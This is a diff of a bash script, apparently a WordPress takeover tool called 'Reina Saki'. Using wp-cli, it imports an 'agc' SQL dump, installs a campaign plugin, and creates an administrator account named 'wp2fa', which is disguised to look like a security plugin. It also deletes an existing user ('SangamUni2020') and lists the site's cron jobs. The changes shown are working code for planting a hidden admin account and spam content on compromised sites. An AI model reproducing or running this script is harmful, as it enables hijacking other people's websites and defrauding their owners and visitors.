@@ -1,8 +1,8 @@
 #!/bin/bash 
-# Reina Akiara v.0.1
+# Reina Saki v.0.1
 
 
-#		---	PANG
+#		---	Colors
 red="\033[1;31m"
 green="\033[1;32m"
 blue="\033[1;34m"
@@ -65,9 +65,8 @@ _INSTALLAGC() {
 	username="wp2fa"
 	curl -sO https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar
 
-	echo -e "${blue}[~]${norm} Changing Permalinks..."
 		php wp-cli.phar db query "UPDATE $(php wp-cli.phar db prefix $extra)options SET option_value = '/%postname%/' WHERE option_name = 'permalink_structure'" $extra
-		php wp-cli.phar db query "SELECT * FROM $(php wp-cli.phar db prefix $extra)options WHERE option_name = 'permalink_structure'" $extra
+		#php wp-cli.phar db query "SELECT * FROM $(php wp-cli.phar db prefix $extra)options WHERE option_name = 'permalink_structure'" $extra
 	echo -e "${blue}[~]${norm} Installing Plugin..."
 		php wp-cli.phar plugin install ${source_campaign} --activate $extra
 		php wp-cli.phar plugin install wordpress-importer --activate $extra
@@ -78,9 +77,13 @@ _INSTALLAGC() {
 		php wp-cli.phar db import agc.sql $extra
 		php wp-cli.phar user create ${username} adminwordpress@mailwordpress.com --role=administrator $extra
 	echo -e "${green}[+] Username:${norm} ${username}"
-		php wp-cli.phar user list $extra
 		php wp-cli.phar user delete "SangamUni2020" --reassign=1 $extra
 		php wp-cli.phar user list $extra
+	echo -e "${blue}[~]${norm} Changing Permalinks"
+		php wp-cli.phar db query "UPDATE $(php wp-cli.phar db prefix $extra)options SET option_value = '/%postname%/' WHERE option_name = 'permalink_structure'" $extra
+	echo -e "${green}[+] Dumping wp-cron-event-list"
+		php wp-cli.phar cron event list $extra
+
 }
 
 
